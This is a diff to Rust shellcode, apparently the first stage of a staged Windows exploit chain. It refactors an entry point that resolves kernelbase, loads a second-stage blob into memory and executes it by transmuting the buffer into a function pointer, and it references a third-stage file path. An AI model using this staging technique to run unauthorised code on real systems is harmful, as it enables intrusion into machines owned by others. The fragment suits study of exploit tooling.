@@ -8,7 +8,6 @@
 use windows_sys::Win32::Foundation::GENERIC_WRITE;
 use windows_sys::Win32::Foundation::HANDLE;
 
-use core::arch::asm;
 use core::ffi::c_int;
 use core::ffi::c_void;
 use core::mem::MaybeUninit;
@@ -28,7 +27,7 @@ fn panic(_info: &PanicInfo) -> ! {
     loop {}
 }
 
-type Stage2Fn = fn(*const ShellcodeArgs) -> u64;
+entry_point!(stage1_main);
 
 const STAGE3_ENV_FILENAME: &str = concat!(r#"%LOCALAPPDATA%\..\LocalState\"#, "\0");
 
@@ -58,10 +57,7 @@ struct COLLAT_INFO {
 // and they only define it for UEFI environments
 pub static _fltused: i32 = 0;
 
-#[no_mangle]
-pub extern "C" fn main() -> u64 {
-    unsafe { asm!("and rsp, ~0xf") };
-
+extern "C" fn stage1_main() -> u64 {
     // Kernelbase is required for just about everything
     let kernelbase_ptr = get_kernelbase();
     if kernelbase_ptr.is_none() {
@@ -296,8 +292,8 @@ pub extern "C" fn main() -> u64 {
         return STAGE1_READ_STAGE2_FAILED;
     }
 
-    let stage2: Stage2Fn = unsafe { core::mem::transmute(stage2_mem) };
-    stage2(core::ptr::null())
+    let stage2: ShellcodeEntryFn = unsafe { core::mem::transmute(stage2_mem) };
+    unsafe { stage2(core::ptr::null()) }
 }
 
 // #[allow(unused_attributes)]
